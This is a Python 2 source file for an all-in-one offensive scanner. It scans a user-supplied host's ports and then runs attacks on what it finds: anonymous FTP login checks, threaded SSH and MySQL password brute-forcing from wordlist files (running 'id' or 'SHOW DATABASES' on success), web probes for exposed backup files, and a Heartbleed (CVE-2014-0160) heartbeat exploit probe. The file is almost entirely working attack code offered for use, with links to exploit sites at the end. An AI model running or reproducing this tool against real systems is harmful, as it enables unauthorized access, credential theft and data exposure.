import socket
import subprocess
import sys
import paramiko
import os
from ftplib import FTP
from datetime import datetime
import MySQLdb as db
import httplib
import threading
import time
import struct
import select
import re

##SETTINGS##
print "To start scanning enter the hostname \nand choose scanning method (1 - popular ports, 2 - all ports)"
remoteServer    = raw_input("Enter a remote host to scan: ")
checkMethod     = raw_input("Choose scanning method (1 or 2): ")
remoteServerIP  = socket.gethostbyname(remoteServer)

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

subprocess.call('clear', shell=True)


##CLASSES##
def ftp(checkftp):
    try:
        ftp = FTP(remoteServerIP, timeout=15)
        print bcolors.OKGREEN+ftp.login()
    except Exception as e:
        ftp.quit()
    else:
        print ftp.getwelcome()
        print "FTP Anonymous access success!"+bcolors.ENDC
        ftp.quit()

class ssh:
    def __init__(self,remoteServerIP,port):
        self.remoteServerIP = remoteServerIP
        self.port = port

        def attempt(remoteServerIP,UserName,Password):
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(self.remoteServerIP, port=22, username=UserName, password=Password)
                command = 'id'
                (stdin, stdout, stderr) = ssh.exec_command(command)
                Data = stdout.readlines()
            except paramiko.AuthenticationException:
                ssh.close()
            else:
                print bcolors.OKGREEN+'USER: %s \nPASS: %s \nUID: %s' % (UserName, Password, Data)+bcolors.ENDC
                ssh.close()
            ssh.close()
            #return
        
        filename='ssh_user.txt';
        fd = open(filename, "r")
        for line in fd.readlines():
            username, password = line.strip().split(":")
            t = threading.Thread(target=attempt, args=(self.remoteServerIP,username,password))
            t.start()
            time.sleep(0.3)        
        fd.close()


class backups:
    def __init__(self, remoteServerIP, remoteServer, port):
        self.remoteServerIP = remoteServerIP
        self.remoteServer = remoteServer
        self.port = port

        def http(remoteServer,port,path):
            try:
                conn = httplib.HTTPConnection(self.remoteServer, port=self.port, timeout=5)
                conn.request("GET", path)
                r = conn.getresponse()
            except Exception as e:
                conn.close()
            else:
                if r.status == 200:
                    print bcolors.OKGREEN+"http://"+self.remoteServer+path+bcolors.ENDC
                    data = r.read()
                conn.close()
                return

        def https(remoteServer,port,path):
            try:
                conn = httplib.HTTPSConnection(self.remoteServer, port=self.port, timeout=5)
                conn.request("GET", path)
                r = conn.getresponse()
            except Exception as e:
                conn.close()
            else:
                if r.status == 200:
                    print bcolors.OKGREEN+"https://"+self.remoteServer+path+bcolors.ENDC
                    data = r.read()
                conn.close()
                return

        def www(remoteServer,port):
            filename='files_list.txt'
            fd = open(filename, "r")
            for line in fd.readlines():
                path = line.strip()
                if self.port == 80:
                    proto = http
                elif self.port == 443:
                    proto = https
                t = threading.Thread(target=proto, args=(self.remoteServer,self.port,path))
                t.start()
                time.sleep(0.3)
            fd.close()
        www(self.remoteServer,self.port)


class heartbleed:
    def __init__(self, remoteServerIP):    
        self.remoteServerIP = remoteServerIP

        def h2bin(x):
            return x.replace(' ', '').replace('\n', '').decode('hex')
        
        hello = h2bin('''
        16 03 02 00  dc 01 00 00 d8 03 02 53
        43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
        bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
        00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
        00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
        c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
        c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
        c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
        c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
        00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
        03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
        00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
        00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
        00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
        00 0f 00 01 01                                  
        ''')
        
        hb = h2bin(''' 
        18 03 02 00 03
        01 40 00
        ''')
        
        def hexdump(s):
            for b in xrange(0, len(s), 16):
                lin = [c for c in s[b : b + 16]]
                hxdat = ' '.join('%02X' % ord(c) for c in lin)
                pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
                print '  %04x: %-48s %s' % (b, hxdat, pdat)
            print
        
        def recvall(s, length, timeout=5):
            endtime = time.time() + timeout
            rdata = ''
            remain = length
            while remain > 0:
                rtime = endtime - time.time() 
                if rtime < 0:
                    return None
                r, w, e = select.select([s], [], [], 5)
                if s in r:
                    data = s.recv(remain)
                    # EOF?
                    if not data:
                        return None
                    rdata += data
                    remain -= len(data)
            return rdata
                
        
        def recvmsg(s):
            hdr = recvall(s, 5)
            if hdr is None:
                print bcolors.WARNING+'Unexpected EOF receiving record header - server closed connection'+bcolors.ENDC
                return None, None, None
            typ, ver, ln = struct.unpack('>BHH', hdr)
            pay = recvall(s, ln, 10)
            if pay is None:
                print bcolors.WARNING+'Unexpected EOF receiving record payload - server closed connection'.bcolors.ENDC
                return None, None, None
            print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
            return typ, ver, pay
        
        def hit_hb(s):
            s.send(hb)
            while True:
                typ, ver, pay = recvmsg(s)
                if typ is None:
                    print bcolors.OKGREEN+'No heartbeat response received, server likely not vulnerable'+bcolors.ENDC
                    return False
        
                if typ == 24:
                    print bcolors.FAIL+'Received heartbeat response:'
                    #hexdump(pay)
                    if len(pay) > 3:
                        print 'WARNING: server returned more data than it should - server is vulnerable!'+bcolors.ENDC
                    else:
                        print 'Server processed malformed heartbeat, but did not return any extra data.'+bcolors.ENDC
                    return True
        
                if typ == 21:
                    print bcolors.WARNING+'Received alert:'+bcolors.ENDC
                    #hexdump(pay)
                    print bcolors.OKGREEN+'Server returned error, likely not vulnerable'+bcolors.ENDC
                    return False
        
        def main():
            p = 443
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            print '\nChecking for possible heartbleed vulnerability [ CVE-2014-0160 ]'
            print 'Connecting...'
            sys.stdout.flush()
            s.connect((self.remoteServerIP, p))
            print 'Sending Client Hello...'
            sys.stdout.flush()
            s.send(hello)
            print 'Waiting for Server Hello...'
            sys.stdout.flush()
            while True:
                typ, ver, pay = recvmsg(s)
                if typ == None:
                    print bcolors.OKGREEN+'Server closed connection without sending Server Hello.'+bcolors.ENDC
                    return
                # Look for server hello done message.
                if typ == 22 and ord(pay[0]) == 0x0E:
                    break
        
            print 'Sending heartbeat request...'
            sys.stdout.flush()
            s.send(hb)
            hit_hb(s)
        
        if __name__ == '__main__':
            main()


class mysql:
    def __init__(self,remoteServerIP,port):
        self.remoteServerIP = remoteServerIP
        self.port = port
        DB = "information_schema"
        TIMEOUT = 10
        
        def mysqlbrute(remoteServerIP,port,username,password,DB,TIMEOUT):
            try:
                connection = db.Connection(host=self.remoteServerIP, port=self.port, user=username, passwd=password, db=DB, connect_timeout=TIMEOUT)
                dbhandler = connection.cursor()
                dbhandler.execute("SHOW DATABASES")
                result = dbhandler.fetchall()
            except Exception:
                sys.tracebacklimit = 0
            else:
                if result == '':
                    connection.close()
                else:
                    for item in result:
                        print item
            
        filename='mysql_user.txt'
        fd = open(filename, "r")
        for line in fd.readlines():
            username, password = line.strip().split(":")
            t = threading.Thread(target=mysqlbrute, args=(self.remoteServerIP,self.port,username,password,DB,TIMEOUT))
            t.start()
            time.sleep(0.3)           
        fd.close()





##START CHECK##
print "-" * 80
print "Please wait while scanning remote host "+remoteServerIP+" [ "+bcolors.UNDERLINE+remoteServer+bcolors.ENDC+" ]"
print "Scanning is in progress..."
print "-" * 80


t1 = datetime.now()

if checkMethod == str(1):
    scanPorts = [0,21,22,23,24,25,80,8080,443,1433,1521,3306,3389,5432,27017,31337,31338]
elif checkMethod == str(2):
    scanPorts = range(0,15000)

try:
    for port in scanPorts:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((remoteServerIP, port))
        sys.stdout.write("\rScanned ports:%s" % port)
        sys.stdout.flush()
        if result == 0:
            print "\nPort {}: \t Open".format(port)
            if port == 21:
                ftp(remoteServerIP)
            if port == 22:
                sshcheck = ssh(remoteServerIP,port)
            if port == 80:
                bc = backups(remoteServerIP,remoteServer,port)
            if port == 443:
                bc = backups(remoteServerIP,remoteServer,port)
                hbcheck = heartbleed(remoteServerIP)
            if port == 3306:
                mysqlcheck = mysql(remoteServerIP,port)
        sock.close()
except KeyboardInterrupt:
    print "You pressed Ctrl+C"
    sys.exit()

except socket.gaierror:
    print 'Hostname could not be resolved. Exiting'
    sys.exit()

except socket.error:
    print "Couldn't connect to server"
    sys.exit()

t2 = datetime.now()

total =  t2 - t1

print '\nScanning Completed in: ', total
print 'You can use our online scanners & databases @ http://scanforsecurity.com\nand https://exploit.by!'
